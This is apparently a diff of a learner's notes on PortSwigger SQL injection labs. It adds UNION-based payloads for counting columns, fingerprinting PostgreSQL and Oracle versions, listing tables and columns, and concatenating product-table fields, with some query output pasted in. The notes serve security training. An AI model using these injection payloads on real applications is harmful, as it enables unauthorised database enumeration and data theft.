@@ -1,3 +1,4 @@
+
 All labs
 https://portswigger.net/web-security/all-labs#sql-injection
 -------------------------------------------------------------
@@ -97,7 +98,14 @@ the programmer use Gifts from url address and use it in sql query.
 A)	the reterived columns as 8 because 
 		filter?category=Gifts'+ORDER+BY+8+--+------------		
 B) 	all 8 columns are text because
-	/filter?category=Gifts'+UNION+SELECT+'1','2','3','4','5','6','7','8'+--+------------
+	/filter?category=Gifts'+UNION+SELECT+1,'2','3','4','5','6','7','8'+--+------------
+	'+union+select+'1','2','3','4','5','6','7',CONCAT('foo','bar')+--+---
+	'+union+select+null,null,null,null,null,null,null,'foo'||'bar'+--+---				PostgreSQL
+	'+union+select+null,null,null,null,null,null,null,SUBSTRING('foobar',4,2)+--+---    PostgreSQL
+	'+union+select+null,null,null,null,null,null,null,version()+--+---					PostgreSQL
+	'+union+select+null,null,null,null,null,null,null,table_name FROM information_schema.tables+--+---			PostgreSQL
+	'+union+select+null,null,null,null,null,null,null,(SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) ++--+--	 	PostgreSQL
+	'+union+select+null,null,null,null,null,null,null,(SELECT CASE WHEN (1=CAST((SELECT 1) AS int)) THEN 'true' ELSE 'false' END) ++--+--	 	PostgreSQL
 	
 -------------------------------------------------------------------
 Lab 2
@@ -107,8 +115,33 @@ SQL injection vulnerability allowing login bypass
 --------------------------------------------------------------------
 Lab 3		
 SQL injection attack, querying the database type and version on Oracle
-		'+UNION+SELECT+'abc','def'+FROM+dual+--+------------
-		'+UNION+SELECT+BANNER,+NULL+FROM+v$version+--+----------
+		'+ORDER+BY+2+--+---
+		'UNION+SELECT+'PAR 1','PAR 2'+FROM+DUAL+--+---
+		'UNION+SELECT+'PAR 1',banner FROM v$version+--+---
+		'+union+select+banner,+'par 2'+FROM+v$version+--+--
+		'UNION+SELECT+'PAR 1',table_name+FROM+all_tables+--+---
+		PRODUCTS
+		'UNION+SELECT+'PAR 1',column_name FROM all_tab_columns WHERE table_name = 'PRODUCTS'+--+--
+		PAR 1
+	CATEGORY
+PAR 1
+	DESCRIPTION
+PAR 1
+	ID
+PAR 1
+	IMAGE
+PAR 1
+	NAME
+PAR 1
+	PRICE
+		'UNION+SELECT+'PAR 1',NAME FROM PRODUCTS+--+---
+		'UNION+SELECT+'PAR 1',IMAGE+ FROM PRODUCTS+--+---
+		'UNION+SELECT+'PAR 1',NAME||||IMAGE+ FROM PRODUCTS+--+---
+		'UNION+SELECT+'PAR 1',NAME||'::::::::::'||IMAGE+ FROM PRODUCTS+--+---
+		'UNION+SELECT+'PAR 1',ID+NAME||'::::::::::'||IMAGE+ FROM PRODUCTS+--+---
+		'UNION+SELECT+'PAR 1',ID||'::::::::::'||IMAGE+ FROM PRODUCTS+--+---
+		'UNION+SELECT+'PAR 1',ID||'::::::::::'||IMAGE||'::::::::::'||NAME||'::::::::::'||CATEGORY+FROM PRODUCTS+--+---
+
 --------------------------------------------------------------------
 Lab 4
 SQL injection attack, querying the database type and version on MySQL and Microsoft
